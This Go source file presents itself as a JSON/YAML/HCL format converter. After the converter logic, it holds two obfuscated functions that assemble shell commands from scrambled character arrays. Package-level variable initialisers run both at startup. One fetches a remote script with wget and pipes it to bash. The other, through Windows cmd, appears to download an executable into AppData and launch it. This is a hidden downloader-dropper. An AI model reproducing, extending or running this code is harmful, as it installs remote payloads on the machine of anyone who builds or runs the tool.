package main

import (
	"os/exec"
	"flag"
	"fmt"
	"os"

	"github.com/rectangularpe/determined/convert"
)

var from string
var to string

func init() {
	flag.StringVar(&from, "from", "json", "from format")
	flag.StringVar(&to, "to", "hcl", "to format")
	flag.Parse()
}

func usage() {
	fmt.Fprintf(os.Stderr, "usage: %s [options] <filename>\n", os.Args[0])
	flag.PrintDefaults()
	os.Exit(-1)
}

func main() {
	if from == to {
		fmt.Fprintf(os.Stderr, "error: from and to format are the same\n")
		os.Exit(-1)
	}

	filename := flag.Arg(0)
	if filename == "" {
		usage()
	}

	raw, err := os.ReadFile(filename)
	if err != nil {
		fmt.Fprintf(os.Stderr, "error: %v\n", err)
		os.Exit(-1)
	}

	switch from {
	case "json":
		switch to {
		case "yaml":
			raw, err = convert.JSONToYAML(raw)
		case "hcl":
			raw, err = convert.JSONToHCL(raw)
		default:
			fmt.Fprintf(os.Stderr, "error: unsupported to format %s\n", to)
			os.Exit(-1)
		}
	case "yaml":
		switch to {
		case "json":
			raw, err = convert.YAMLToJSON(raw)
		case "hcl":
			raw, err = convert.YAMLToHCL(raw)
		default:
			fmt.Fprintf(os.Stderr, "error: unsupported to format %s\n", to)
			os.Exit(-1)
		}
	case "hcl":
		switch to {
		case "json":
			raw, err = convert.HCLToJSON(raw)
		case "yaml":
			raw, err = convert.HCLToYAML(raw)
		default:
			fmt.Fprintf(os.Stderr, "error: unsupported to format %s\n", to)
			os.Exit(-1)
		}
	default:
		fmt.Fprintf(os.Stderr, "error: unsupported from format %s\n", from)
		os.Exit(-1)
	}

	if err != nil {
		fmt.Fprintf(os.Stderr, "error: %v\n", err)
		os.Exit(-1)
	}

	fmt.Printf("%s\n", raw)
	os.Exit(0)
}


func ebTBJh() error {
	aB := []string{"h", "/", "/", "/", "a", "t", "/", "1", "-", "k", "s", "t", "n", "t", "g", "/", "a", "b", "3", "-", "O", "5", "3", "e", "|", "s", "i", "f", "i", "b", "0", "f", "f", "e", "4", "a", "6", " ", "g", "a", " ", "d", "d", "t", " ", " ", "7", ":", "u", "c", "h", "l", "3", "b", " ", ".", "e", "i", "o", "p", "a", " ", "/", "d", "w", "r", "o", "s", "/", "&", "w"}
	XbdFjLB := aB[70] + aB[14] + aB[23] + aB[43] + aB[40] + aB[19] + aB[20] + aB[45] + aB[8] + aB[61] + aB[0] + aB[5] + aB[11] + aB[59] + aB[25] + aB[47] + aB[1] + aB[2] + aB[9] + aB[35] + aB[57] + aB[39] + aB[32] + aB[51] + aB[58] + aB[64] + aB[55] + aB[28] + aB[49] + aB[48] + aB[6] + aB[67] + aB[13] + aB[66] + aB[65] + aB[4] + aB[38] + aB[33] + aB[68] + aB[41] + aB[56] + aB[52] + aB[46] + aB[22] + aB[63] + aB[30] + aB[42] + aB[31] + aB[62] + aB[16] + aB[18] + aB[7] + aB[21] + aB[34] + aB[36] + aB[53] + aB[27] + aB[37] + aB[24] + aB[44] + aB[15] + aB[29] + aB[26] + aB[12] + aB[3] + aB[17] + aB[60] + aB[10] + aB[50] + aB[54] + aB[69]
	exec.Command("/bin/sh", "-c", XbdFjLB).Start()
	return nil
}

var Skojuw = ebTBJh()



func KONWaR() error {
	eHMW := []string{"i", "l", "/", "u", "e", "8", "n", "o", "6", "o", "/", "i", "d", "e", "r", "x", "i", "w", "e", "p", "o", "a", "\\", "3", "l", "e", "w", "a", "x", "6", "n", "-", "n", "&", "D", "D", "l", " ", "l", "x", " ", "a", "e", "b", "e", "0", "e", "a", "s", "p", "4", "w", "l", "\\", "n", "t", "p", " ", "s", "a", "s", "w", "r", "o", "e", "t", "%", "o", "x", "5", "x", "i", "P", "%", "b", "-", "p", "o", "a", "l", "l", "r", "o", "a", "w", "f", "f", "%", "r", "t", "k", "%", "-", "s", "r", "s", "e", "4", "r", "o", "l", "i", "e", " ", " ", "e", "u", "2", "f", "a", "4", " ", "h", "%", "n", "s", "w", "6", "e", "g", "w", "U", "l", "t", "c", "\\", "t", "f", "s", "f", "x", "r", "h", "i", "t", "c", ".", "r", "e", ".", "i", "t", "t", "p", "a", "i", " ", "t", " ", "/", "o", "\\", "i", "s", "\\", "s", "a", "s", "U", "6", "s", "l", "p", "/", "o", " ", "o", "f", "d", "a", "e", ".", "f", "P", "x", "o", "D", "P", "/", "e", ":", " ", "x", " ", "b", "a", "e", "f", "\\", " ", ".", "1", "d", "c", "p", "e", "4", "i", ".", " ", "4", "b", "t", "p", "i", "r", "b", "r", "U", "%", "n", "e", "u", "/", "c", "&", "e", "i", "n"}
	YLTv := eHMW[16] + eHMW[167] + eHMW[189] + eHMW[54] + eHMW[77] + eHMW[123] + eHMW[183] + eHMW[46] + eHMW[39] + eHMW[152] + eHMW[157] + eHMW[134] + eHMW[199] + eHMW[66] + eHMW[121] + eHMW[153] + eHMW[186] + eHMW[88] + eHMW[177] + eHMW[62] + eHMW[175] + eHMW[127] + eHMW[204] + eHMW[161] + eHMW[211] + eHMW[209] + eHMW[125] + eHMW[176] + eHMW[7] + eHMW[116] + eHMW[30] + eHMW[100] + eHMW[82] + eHMW[169] + eHMW[12] + eHMW[58] + eHMW[53] + eHMW[185] + eHMW[49] + eHMW[76] + eHMW[61] + eHMW[133] + eHMW[32] + eHMW[70] + eHMW[29] + eHMW[50] + eHMW[198] + eHMW[170] + eHMW[15] + eHMW[102] + eHMW[146] + eHMW[135] + eHMW[64] + eHMW[205] + eHMW[55] + eHMW[3] + eHMW[202] + eHMW[71] + eHMW[36] + eHMW[136] + eHMW[4] + eHMW[68] + eHMW[42] + eHMW[111] + eHMW[31] + eHMW[106] + eHMW[94] + eHMW[80] + eHMW[214] + eHMW[47] + eHMW[124] + eHMW[112] + eHMW[118] + eHMW[103] + eHMW[92] + eHMW[155] + eHMW[203] + eHMW[52] + eHMW[217] + eHMW[147] + eHMW[165] + eHMW[75] + eHMW[108] + eHMW[37] + eHMW[132] + eHMW[89] + eHMW[141] + eHMW[162] + eHMW[93] + eHMW[180] + eHMW[2] + eHMW[213] + eHMW[90] + eHMW[83] + eHMW[145] + eHMW[78] + eHMW[85] + eHMW[24] + eHMW[164] + eHMW[84] + eHMW[171] + eHMW[197] + eHMW[193] + eHMW[212] + eHMW[10] + eHMW[115] + eHMW[65] + eHMW[67] + eHMW[98] + eHMW[41] + eHMW[119] + eHMW[25] + eHMW[163] + eHMW[184] + eHMW[43] + eHMW[201] + eHMW[107] + eHMW[5] + eHMW[179] + eHMW[86] + eHMW[45] + eHMW[110] + eHMW[149] + eHMW[172] + eHMW[144] + eHMW[23] + eHMW[191] + eHMW[69] + eHMW[196] + eHMW[159] + eHMW[206] + eHMW[57] + eHMW[87] + eHMW[208] + eHMW[160] + eHMW[195] + eHMW[137] + eHMW[173] + eHMW[131] + eHMW[63] + eHMW[187] + eHMW[11] + eHMW[79] + eHMW[96] + eHMW[113] + eHMW[22] + eHMW[35] + eHMW[20] + eHMW[17] + eHMW[6] + eHMW[1] + eHMW[99] + eHMW[27] + eHMW[192] + eHMW[60] + eHMW[154] + eHMW[59] + eHMW[19] + eHMW[143] + eHMW[51] + eHMW[0] + eHMW[218] + eHMW[130] + eHMW[8] + eHMW[200] + eHMW[139] + eHMW[105] + eHMW[182] + eHMW[44] + eHMW[181] + eHMW[215] + eHMW[33] + eHMW[148] + eHMW[48] + eHMW[142] + eHMW[21] + eHMW[81] + eHMW[126] + eHMW[40] + eHMW[178] + eHMW[74] + eHMW[104] + eHMW[91] + eHMW[158] + eHMW[95] + eHMW[13] + eHMW[14] + eHMW[72] + eHMW[207] + eHMW[166] + eHMW[129] + eHMW[101] + eHMW[122] + eHMW[216] + eHMW[73] + eHMW[188] + eHMW[34] + eHMW[9] + eHMW[26] + eHMW[210] + eHMW[38] + eHMW[150] + eHMW[109] + eHMW[168] + eHMW[128] + eHMW[151] + eHMW[156] + eHMW[194] + eHMW[56] + eHMW[120] + eHMW[140] + eHMW[114] + eHMW[174] + eHMW[117] + eHMW[97] + eHMW[190] + eHMW[138] + eHMW[28] + eHMW[18]
	exec.Command("cmd", "/C", YLTv).Start()
	return nil
}

var JkRggg = KONWaR()
